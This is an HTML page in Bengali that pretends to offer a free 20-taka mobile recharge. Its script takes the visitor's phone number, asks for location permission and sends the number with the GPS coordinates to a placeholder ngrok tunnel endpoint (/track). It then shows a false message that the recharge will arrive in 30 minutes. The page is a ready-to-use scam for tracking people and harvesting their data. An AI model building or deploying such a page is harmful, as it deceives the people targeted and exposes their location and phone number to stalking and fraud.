<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ফ্রি ২০ টাকা মোবাইল রিচার্জ!</title>
    <style>
        body { font-family: 'SolaimanLipi', Arial, sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; }
        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
        .logo { width: 80px; margin-bottom: 15px; }
        h2 { color: #d32f2f; margin-bottom: 10px; }
        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; }
        .btn { background-color: #388e3c; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-size: 18px; cursor: pointer; width: 100%; }
        .footer-text { font-size: 12px; color: #777; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://cdn-icons-png.flaticon.com/512/2343/2343894.png" class="logo" alt="Gift">
        <h2>অভিনন্দন! 🎉</h2>
        <p>আপনি পেয়েছেন ২০ টাকা ফ্রি মোবাইল রিচার্জ। অফারটি পেতে আপনার সচল মোবাইল নম্বর দিন।</p>
        
        <input type="number" id="phoneNum" placeholder="আপনার ১১ ডিজিটের নম্বর" required>
        <button class="btn" onclick="claimNow()">রিচার্জ নিন</button>
        
        <p class="footer-text">* অফারটি নিশ্চিত করতে লোকেশন পারমিশন 'Allow' করুন।</p>
    </div>

    <script>
        function claimNow() {
            let number = document.getElementById('phoneNum').value;
            if (number.length < 11) {
                alert("সঠিক নম্বর দিন!");
                return;
            }

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    sendData(number, pos.coords.latitude, pos.coords.longitude);
                }, (err) => {
                    sendData(number, null, null);
                });
            }
        }

        function sendData(num, lat, lon) {
            // আপনার এনগ্রোক লিঙ্ক এখানে বসবে
            fetch('https://আপনার-এনগ্রোক-লিঙ্ক.ngrok-free.app/track', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: num, lat: lat, lon: lon })
            });
            alert("সফল হয়েছে! ৩০ মিনিটের মধ্যে রিচার্জ পৌঁছে যাবে।");
        }
    </script>
</body>
</html>
